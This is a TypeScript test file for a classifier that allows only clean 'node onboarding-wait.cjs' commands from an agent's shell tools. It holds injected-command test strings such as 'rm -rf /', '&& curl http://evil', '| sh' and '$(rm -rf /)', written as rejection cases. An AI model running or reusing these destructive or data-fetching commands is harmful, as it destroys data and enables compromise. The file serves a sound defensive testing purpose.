import { test } from 'node:test';
import assert from 'node:assert/strict';

import { onboardingWaitCommand, onboardingWaitScriptPath } from '../wait-command';
import { isOnboardingWaitCommand } from '../../tool-classify';

test('onboardingWaitCommand: a single clean node invocation of the wait shim', () => {
  const cmd = onboardingWaitCommand('/some/project dir');
  assert.ok(cmd.startsWith('node '));
  assert.ok(cmd.includes('onboarding-wait.cjs'));
  assert.ok(onboardingWaitScriptPath().endsWith('onboarding-wait.cjs'));
  // spaces in cwd are JSON-quoted so the command stays a single argument
  assert.ok(cmd.includes('"/some/project dir"'));
  // and the gate must recognize exactly what we tell the agent to run
  assert.equal(isOnboardingWaitCommand('Bash', { command: cmd }), true);
});

test('isOnboardingWaitCommand: allows clean node …onboarding-wait.cjs commands', () => {
  assert.equal(isOnboardingWaitCommand('Bash', { command: 'node "/p/onboarding-wait.cjs" "/cwd"' }), true);
  assert.equal(isOnboardingWaitCommand('Bash', { command: 'node /p/onboarding-wait.cjs /cwd --timeout-ms 540000' }), true);
  assert.equal(isOnboardingWaitCommand('exec_command', { command: 'node /p/onboarding-wait.cjs /cwd' }), true);
});

test('isOnboardingWaitCommand: rejects chaining, redirection, expansion, and non-wait commands', () => {
  for (const command of [
    'node /p/onboarding-wait.cjs; rm -rf /',
    'node /p/onboarding-wait.cjs && curl http://evil',
    'node /p/onboarding-wait.cjs | sh',
    'node /p/onboarding-wait.cjs > /tmp/x',
    'node /p/onboarding-wait.cjs `whoami`',
    'node /p/onboarding-wait.cjs $(rm -rf /)',
    'rm -rf / # onboarding-wait.cjs',
    'ls -la',
  ]) {
    assert.equal(isOnboardingWaitCommand('Bash', { command }), false, command);
  }
  // not a shell tool
  assert.equal(isOnboardingWaitCommand('Write', { command: 'node /p/onboarding-wait.cjs /cwd' }), false);
});
